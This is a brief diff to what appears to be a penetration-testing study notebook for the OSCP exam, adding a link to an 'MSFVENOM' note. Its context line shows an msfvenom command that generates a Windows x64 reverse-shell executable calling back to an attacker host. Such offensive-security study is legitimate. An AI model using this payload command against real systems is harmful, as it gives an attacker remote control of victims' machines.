@@ -11,6 +11,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe -o shell
 - [20221009005402](/zet/20221009005402/README.md) preparing for the OSCP exam
 - [20221003150771](/zet/20221003150771/README.md) MSFVENOM Windows Binary (.exe) executable 64 Bit (x64)
 - ~/kb/hacking/commands/msfvenom-commands.md
+- [20221003150777](/zet/20221003150777/README.md) MSFVENOM
 
 Tags:
 
